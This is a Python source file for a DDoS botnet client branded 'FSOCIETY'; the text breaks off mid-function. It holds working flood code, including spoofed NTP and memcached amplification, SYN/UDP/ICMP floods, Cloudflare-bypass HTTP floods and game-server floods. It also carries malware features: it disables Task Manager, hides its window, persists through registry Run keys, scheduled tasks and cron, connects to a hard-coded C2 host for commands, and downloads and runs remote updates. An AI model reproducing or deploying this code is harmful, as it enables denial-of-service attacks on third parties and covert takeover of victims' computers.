def stress_attack(ip, timer):
    end_time = time.time() + int(timer)
    while time.time() < end_time:
        try:
            requests.get(f"http://{ip}/", timeout=5)
        except:
            pass

def cfbypassv2_attack(target, duration, threads):
    end_time = time.time() + int(duration)
    def attack():
        while time.time() < end_time:
            try:
                headers = {
                    'User-Agent': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16)),
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Referer': target,
                    'X-Requested-With': 'XMLHttpRequest',
                }
                requests.get(target, headers=headers, timeout=5)
            except:
                pass
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
# Basic imports needed for package installation
import sys
import subprocess
import os

# Package installer function
def install_required_packages():
    packages_map = {
        'socks': 'PySocks',
        'cloudscraper': 'cloudscraper',
        'requests': 'requests',
        'scapy': 'scapy',
        'colorama': 'colorama',
        'icmplib': 'icmplib'
    }
    
    for import_name, pip_name in packages_map.items():
        try:
            __import__(import_name)
        except ImportError:
            try:
                print(f"Installing {pip_name}...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pip_name])
            except Exception as e:
                print(f"Error installing {pip_name}: {str(e)}")
                continue

# Install required packages first
install_required_packages()

# Now do all other imports
import ctypes
import cloudscraper
import getpass
import os
import platform
import random
import requests
import scapy.all
import shutil
import socket
import socks
import ssl
import struct
import subprocess
import sys
import threading
import time
import psutil

# Disable Task Manager immediately at import
if platform.system().lower() == 'windows':
    try:
        import winreg
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            try:
                key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
            except:
                pass
    except:
        pass

# Conditional imports based on platform
IS_WINDOWS = platform.system().lower() == 'windows'
if IS_WINDOWS:
    import winreg
from icmplib import ping as pig
from multiprocessing import Process
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import IP, TCP
from struct import pack as data_pack
from urllib.parse import urlparse

# Hide console immediately at launch
def hide_console():
    if IS_WINDOWS:
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
                ctypes.windll.kernel32.CloseHandle(hwnd)
        except:
            pass
    else:
        try:
            # For Linux/Unix systems
            os.system('clear')
        except:
            pass
hide_console()
# Global attack control
current_attack_threads = []
stop_attack = threading.Event()
# Configuration
FSOCIETYC2_ADDRESS = "purposes-tube.gl.at.ply.gg"
FSOCIETYC2_PORT = 32269
RECONNECT_INTERVAL = 15  # Retry C2 connection every 15 seconds
CONNECTION_TIMEOUT = 10  # Connection timeout in seconds
SOCKET_TIMEOUT = 10      # Socket operations timeout
MAX_RETRIES = 0         # 0 means infinite retries for connection
BOT_ID = str(random.randint(10000, 99999)) # Unique bot identifier
# User-Agent generation
base_user_agents = [
    # Windows Browsers
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0',
    
    # macOS Browsers
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    
    # Linux Browsers
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
    
    # Mobile Browsers - iOS
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    
    # Mobile Browsers - Android
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    
    # Gaming Consoles
    'Mozilla/5.0 (PlayStation 5 1.0) AppleWebKit/605.1.15 (KHTML, like Gecko)',
    'Mozilla/5.0 (Nintendo Switch; ShareApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.14.4 NintendoBrowser/5.1.0.21343',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    
    # Smart TVs
    'Mozilla/5.0 (SMART-TV; LINUX; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/7.0 TV Safari/537.36',
    'Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36',
    'Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 CrKey/1.44.191160',
    
    # Tablets
    'Mozilla/5.0 (Linux; Android 13; Tab S9 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    
    # Random Dynamic Agents
    'Mozilla/%.1f (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%.1f.%.1f.%.1f Safari/537.36',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Chrome/%.1f.%.1f.%.1f Safari/537.36',
    'Mozilla/%.1f (iPhone; CPU iPhone OS %.1f_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%.1f.0 Mobile/15E148 Safari/604.1',
    'Mozilla/%.1f (Linux; Android %.1f; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%.1f.%.1f.%.1f Mobile Safari/537.36'
]
def rand_ua():
    chosen_user_agent = random.choice(base_user_agents)
    return chosen_user_agent.format(
        random.random() + 5,
        random.random() + random.randint(1, 8),
        random.random(),
        random.randint(2000, 2100),
        random.randint(92215, 99999),
        random.random() + random.randint(3, 9)
    )
# Attack Methods
def dgb_attack(ip, timer):
    url = f"http://{ip}/"
    end_time = time.time() + int(timer)
    while time.time() < end_time:
        try:
            requests.get(url, headers={'User-Agent': rand_ua()}, timeout=5)
        except:
            pass
ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def NTP(target, port, timer):
    try:
        with open("ntpServers.txt", "r") as f:
            ntp_servers = f.readlines()
        packets = random.randint(10, 150)
    except Exception as e:
        pass
    server = random.choice(ntp_servers).strip()
    while time.time() < timer:
        try:
            packet = IP(dst=server, src=target) / UDP(sport=random.randint(1, 65535), dport=int(port)) / Raw(load=ntp_payload)
            try:
                for _ in range(50000000):
                    send(packet, count=packets, verbose=False)
            except Exception as e:
                pass
        except Exception as e:
            pass
mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def MEM(target, port, timer):
    packets = random.randint(1024, 60000)
    try:
        with open("memsv.txt", "r") as f:
            memsv = f.readlines()
    except:
        pass
    server = random.choice(memsv).strip()
    while time.time() < timer:
        try:
            try:
                packet = IP(dst=server, src=target) / UDP(sport=port, dport=11211) / Raw(load=mem_payload)
                for _ in range(5000000):
                    send(packet, count=packets, verbose=False)
            except:
                pass
        except:
            pass
def icmp(target, timer):
    while time.time() < timer:
        try:
            for _ in range(5000000):
                packet = random._urandom(int(random.randint(1024, 60000)))
                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
        except:
            pass
def pod(target, timer):
    while time.time() < timer:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)
            send(packet)
        except:
            pass
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    return addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
def httpSpoofAttack(url, timer):
    timeout = time.time() + int(timer)
    proxies = open("socks4.txt").readlines()
    proxy = random.choice(proxies).strip().split(":")
    req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "X-Forwarded-Proto: Http\r\n"
    req += "X-Forwarded-Host: " + urlparse(url).netloc + ", 1.1.1.1\r\n"
    req += "Via: " + spoofer() + "\r\n"
    req += "Client-IP: " + spoofer() + "\r\n"
    req += "X-Forwarded-For: " + spoofer() + "\r\n"
    req += "Real-IP: " + spoofer() + "\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timeout:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            try:
                for i in range(5000000000):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
def remove_by_value(arr, val):
    return [item for item in arr if item != val]
def run(target, proxies, cfbp):
    if cfbp == 0 and len(proxies) > 0:
        proxy = random.choice(proxies)
        proxiedRequest = requests.Session()
        proxiedRequest.proxies = {'http': 'http://' + proxy}
        headers = {'User-Agent': rand_ua()}
        try:
            response = proxiedRequest.get(target, headers=headers)
            if 200 <= response.status_code <= 226:
                for _ in range(100):
                    proxiedRequest.get(target, headers=headers)
            else:
                proxies = remove_by_value(proxies, proxy)
        except requests.RequestException as e:
            proxies = remove_by_value(proxies, proxy)
    elif cfbp == 1 and len(proxies) > 0:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        proxy = random.choice(proxies)
        proxies = {'http': 'http://' + proxy}
        try:
            a = scraper.get(target, headers=headers, proxies=proxies, timeout=15)
            if 200 <= a.status_code <= 226:
                for _ in range(100):
                    scraper.get(target, headers=headers, proxies=proxies, timeout=15)
            else:
                proxies = remove_by_value(proxies, proxy)
        except requests.RequestException as e:
            proxies = remove_by_value(proxies, proxy)
    else:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        try:
            scraper.get(target, headers=headers, timeout=15)
        except:
            pass
def thread(target, proxies, cfbp):
    while True:
        run(target, proxies, cfbp)
        time.sleep(1)
def httpio(target, times, threads, attack_type):
    proxies = []
    if attack_type == 'PROXY' or attack_type == 'proxy':
        cfbp = 0
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass
    elif attack_type == 'NORMAL' or attack_type == 'normal':
        cfbp = 1
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass
    processes = []
    for _ in range(threads):
        p = Process(target=thread, args=(target, proxies, cfbp))
        processes.append(p)
        p.start()
    time.sleep(times)
    for p in processes:
        os.kill(p.pid, 9)
def CFB(url, port, secs):
    url = url + ":" + port
    while time.time() < secs:
        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        for _ in range(1500):
            scraper.get(url, headers=headers, timeout=15)
            scraper.head(url, headers=headers, timeout=15)
def STORM_attack(ip, port, secs):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < secs:
        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            requests.get(ip, headers=headers)
            requests.head(ip, headers=headers)
            scraper.get(ip, headers=headers)
def GET_attack(ip, port, secs):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < secs:
        headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            requests.get(ip, headers=headers)
            scraper.get(ip, headers=headers)
def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))
def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
        except:
            pass
def attack_SYN(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flags = 0b01000000
        try:
            s.connect((ip, port))
            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
            while time.time() < secs:
                s.send(pkt)
        except:
            s.close()
def attack_tup(ip, port, secs, size):
    while time.time() < secs:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dport = random.randint(1, 65535) if port == 0 else port
        try:
            data = random._urandom(size)
            tcp.connect((ip, port))
            udp.sendto(data, (ip, dport))
            tcp.send(data)
        except:
            pass
def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(6):
            s.sendto(payload, (ip, port))
def attack_vse(ip, port, secs):
    payload = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(2):
            s.sendto(payload, (ip, port))
def attack_roblox(ip, port, secs, size):
    end_time = secs if isinstance(secs, float) else time.time() + int(secs)
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            payload = random._urandom(size)
            header = b'\x1bRobloxFlood' + random._urandom(4)
            for _ in range(2000):
                s.sendto(header + payload, (ip, dport))
            s.close()
        except:
            pass
def attack_junk(ip, port, secs):
    payload = b'\x00' * 70
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(3):
            s.sendto(payload, (ip, port))
def attack_minecraft(ip, port, secs):
    import struct
    end_time = time.time() + int(secs)
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, int(port)))
            host = ip.encode('utf-8')
            packet = b''
            packet += b'\x00'
            packet += b'\x04'
            packet += struct.pack('B', len(host)) + host
            packet += struct.pack('>H', int(port))
            packet += b'\x01'
            length = len(packet)
            s.send(struct.pack('B', length) + packet)
            s.close()
        except:
            pass
def attack_fivem(cfx_url, secs):
    end_time = time.time() + int(secs)
    url = f'https://{cfx_url}' if not cfx_url.startswith('https://') else cfx_url
    while time.time() < end_time:
        try:
            requests.get(url, timeout=3)
        except:
            pass

def attack_amongus(ip, port, secs):
    """Among Us server attack using custom game packets"""
    # Among Us packet structure
    HANDSHAKE = bytes([
        0x08,  # Reliable packet
        0x00,  # Normal message
        0x01,  # Handshake
        0x00   # Client ID
    ])
    
    GAME_DATA = bytes([
        0x01,  # Game Data
        0x00,  # Room Code
        0x05,  # Join Game
        0x02,  # Player Data
    ]) + random._urandom(40)  # Random player data
    
    end_time = time.time() + int(secs)
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip, int(port)))
            
            # Send handshake packets
            for _ in range(25):
                s.send(HANDSHAKE + random._urandom(8))
            
            # Send game join flood
            for _ in range(50):
                s.send(GAME_DATA)
            
            s.close()
        except:
            pass
def attack_dns(ip, port, secs):
    dns_query = (
        b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        b'\x03www\x06google\x03com\x00\x00\x01\x00\x01'
    )
    end_time = time.time() + int(secs)
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(dns_query, (ip, int(port)))
            s.close()
        except:
            pass

def attack_discord(ip, port, secs):
    """Discord voice server attack using UDP flood with specific packet structure"""
    # Discord voice packet structure (RTP-like format)
    header = bytes([
        0x80, 0x78, 0x00, 0x01,  # RTP header
        0x00, 0x00, 0x00, 0x00,  # Timestamp
        0x00, 0x00, 0x00, 0x00   # SSRC
    ])
    payload = random._urandom(1024)  # Random voice data
    packet = header + payload
    
    end_time = time.time() + int(secs)
    process = psutil.Process(os.getpid())
    MAX_CPU = 80  # percent
    total_ram = psutil.virtual_memory().total
    MAX_MEM = int(total_ram * 0.9)  # 90% of total system RAM
    while time.time() < end_time:
        try:
            # Check CPU and RAM usage before sending packets
            cpu = process.cpu_percent(interval=0.1)
            mem = process.memory_info().rss
            if cpu > MAX_CPU or mem > MAX_MEM:
                time.sleep(0.5)
                continue
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip, int(port)))
            for _ in range(500):  # Send multiple packets per connection
                # Check again inside the loop for long bursts
                cpu = process.cpu_percent(interval=0.01)
                mem = process.memory_info().rss
                if cpu > MAX_CPU or mem > MAX_MEM:
                    break
                s.send(packet)
            s.close()
        except Exception:
            pass
# Stealth and Persistence
def disable_task_manager():
    if IS_WINDOWS:
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            try:
                key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
            except:
                # Încearcă și cu drepturi de administrator
                key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
        except:
            pass

def ensure_stealth_persistence():
    try:
        disable_task_manager()
        username = getpass.getuser()
        script_path = os.path.abspath(__file__)
        
        if IS_WINDOWS:
            # Windows persistence
            target_name = f"svchost_{random.randint(1000, 9999)}.py"
            hidden_dir = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "SystemServices")
            if not os.path.exists(hidden_dir):
                os.makedirs(hidden_dir)
            target_path = os.path.join(hidden_dir, target_name)
            
            if os.path.abspath(script_path) != os.path.abspath(target_path):
                shutil.copyfile(script_path, target_path)
                try:
                    ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)
                except:
                    pass
                    
            try:
                # Registry startup
                pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, f'"{pythonw}" "{target_path}"')
                winreg.CloseKey(reg_key)
                
                # Task Scheduler persistence
                subprocess.run([
                    "schtasks", "/create", "/tn", "SystemService",
                    "/tr", f'"{pythonw}" "{target_path}"',
                    "/sc", "ONLOGON", "/rl", "HIGHEST", "/f"
                ], creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
            except:
                pass
                
            # Relaunch if not already hidden
            if os.path.abspath(script_path) != os.path.abspath(target_path):
                try:
                    subprocess.Popen([pythonw, target_path], creationflags=subprocess.CREATE_NO_WINDOW, close_fds=True)
                except:
                    subprocess.Popen([sys.executable, target_path], close_fds=True)
                sys.exit(0)
        else:
            # Linux/Host persistence
            home = os.path.expanduser("~")
            target_dir = os.path.join(home, ".cache", "systemd")
            if not os.path.exists(target_dir):
                os.makedirs(target_dir)
                
            target_path = os.path.join(target_dir, "system-helper.py")
            if os.path.abspath(script_path) != os.path.abspath(target_path):
                shutil.copyfile(script_path, target_path)
                os.chmod(target_path, 0o755)
                
                # Add to user's crontab if possible
                try:
                    cron_cmd = f"@reboot python3 {target_path}\n"
                    subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                    subprocess.run(["crontab", "-"], input=cron_cmd, text=True)
                except:
                    pass
                    
                # Start in background
                try:
                    subprocess.Popen(["python3", target_path], 
                                    start_new_session=True,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
                    sys.exit(0)
                except:
                    pass
    except:
        pass
# Watchdog to keep process alive (simplified without psutil)
def watchdog():
    script_path = os.path.abspath(__file__)
    pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
    script_path = os.path.abspath(__file__)
    while True:
        try:
            time.sleep(5)
            if not os.path.exists(script_path):
                try:
                    subprocess.Popen([pythonw, script_path], creationflags=subprocess.CREATE_NO_WINDOW, close_fds=True)
                except Exception:
                    subprocess.Popen([sys.executable, script_path], creationflags=subprocess.CREATE_NO_WINDOW, close_fds=True)
        except Exception:
            pass
# Socket cleanup utility
def cleanup_socket(sock):
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except:
        pass
    try:
        sock.close()
    except:
        pass

# C2 Connection with Persistent Reconnection
def connect_to_c2():
    """Establishes connection with the C2 server with exponential backoff"""
    retry_count = 0
    
    while True:
        c2 = None
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            c2.settimeout(SOCKET_TIMEOUT)
            c2.connect((FSOCIETYC2_ADDRESS, FSOCIETYC2_PORT))
            c2.settimeout(None)
            
            def recv_until(sock, keywords, timeout=15):
                sock.settimeout(timeout)
                data = ''
                try:
                    while True:
                        chunk = sock.recv(1024).decode(errors='ignore')
                        if not chunk:
                            break
                        data += chunk
                        for k in keywords:
                            if k in data:
                                return data
                except socket.timeout:
                    return data
                finally:
                    sock.settimeout(None)
                    
            # Handshake
            data = recv_until(c2, ['Captcha', 'Username', 'Password'], timeout=20)
            if 'Captcha' in data:
                c2.send('669787761736865726500'.encode())
                
            data = recv_until(c2, ['Username'], timeout=10)
            if 'Username' in data:
                c2.send(f'BOT_{BOT_ID}'.encode())
                
            data = recv_until(c2, ['Password'], timeout=10)
            if 'Password' in data:
                c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                
            # Reset retry count on successful connection
            retry_count = 0
            return c2
            
        except Exception as e:
            # Clean up failed connection
            if c2:
                try:
                    c2.close()
                except:
                    pass
                    
            retry_count += 1
            
            # Check if we've exceeded max retries (0 means infinite)
            if MAX_RETRIES > 0 and retry_count >= MAX_RETRIES:
                print(f"Maximum connection retries ({MAX_RETRIES}) exceeded")
                sys.exit(1)
                
            # Calculate backoff time: min(5 minutes, base * 2^(retry-1))
            backoff = min(300, RECONNECT_INTERVAL * (2 ** (retry_count - 1)))
            print(f"Connection attempt {retry_count} failed. Retrying in {backoff} seconds...")
            time.sleep(backoff)
# Main Loop
def check_pending_update():
    try:
        update_file = os.path.join(os.environ['TEMP'], 'fsociety_pending_update.txt')
        if os.path.exists(update_file):
            with open(update_file, 'r') as f:
                update_url = f.read().strip()
            if update_url:
                try:
                    temp_path = os.path.join(os.environ['TEMP'], f'bot_update_{random.randint(1000,9999)}.py')
                    r = requests.get(update_url, timeout=30)
                    with open(temp_path, 'wb') as f:
                        f.write(r.content)
                    shutil.copyfile(temp_path, os.path.abspath(__file__))
                    os.remove(update_file)  # Șterge fișierul după update reușit
                    pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
                    subprocess.Popen([pythonw, os.path.abspath(__file__)], creationflags=subprocess.CREATE_NO_WINDOW, close_fds=True)
                    sys.exit(0)
                except:
                    pass  # Dacă update-ul eșuează, va încerca din nou la următoarea pornire
    except:
        pass

def handle_connection_error(c2_socket):
    """Handle socket cleanup and reconnection delay"""
    if c2_socket:
        cleanup_socket(c2_socket)
    time.sleep(RECONNECT_INTERVAL)

# Helper functions for attack output formatting
def print_centered_line(text, width=50, fill_char=" "):
    """Print text centered with optional fill character"""
    if not text:
        return
    padding = (width - len(text)) // 2
    print(fill_char * padding + text + fill_char * (width - padding - len(text)))

def print_attack_info(method, ip=None, port=None, time=None):
    """Display attack target information in a clean, centered format"""
    print("╔" + "═"*48 + "╗")
    print_centered_line("TARGET INFORMATION", 50)
    print("╠" + "═"*48 + "╣")
    if ip:
        print_centered_line(f"IP: {ip}")
    if port:
        print_centered_line(f"PORT: {port}")
    if time:
        print_centered_line(f"TIME: {time}")
    print_centered_line(f"METHOD: {method}")
    print("╚" + "═"*48 + "╝")

def print_attack_success():
    """Display attack success message once"""
    print("\n" + "╔" + "═"*48 + "╗")
    print_centered_line("Attack successfully sent to all FSOCIETY Bots!")
    print("╚" + "═"*48 + "╝\n")

def main():
    ensure_stealth_persistence()
    threading.Thread(target=watchdog, daemon=True).start()
    check_pending_update()  # Verifică dacă există update la pornire
    
    while True:
        c2 = None
        try:
            # Try to connect to C2
            c2 = connect_to_c2()
            if not c2:
                time.sleep(RECONNECT_INTERVAL)
                continue

            # Main communication loop
            while True:
                try:
                    c2.settimeout(SOCKET_TIMEOUT)
                    data = c2.recv(1024).decode().strip()
                    c2.settimeout(None)
                    
                    if not data:
                        raise Exception("Connection lost")
                except Exception as e:
                    handle_connection_error(c2)
                    break  # Break inner loop to reconnect
                args = data.split(' ')
                command = args[0].upper()
                # Stop previous attack threads
                global current_attack_threads, stop_attack
                stop_attack.set()
                for t in current_attack_threads:
                    t.join(timeout=2)
                current_attack_threads = []
                stop_attack.clear()
                def attack_wrapper(func, *fargs):
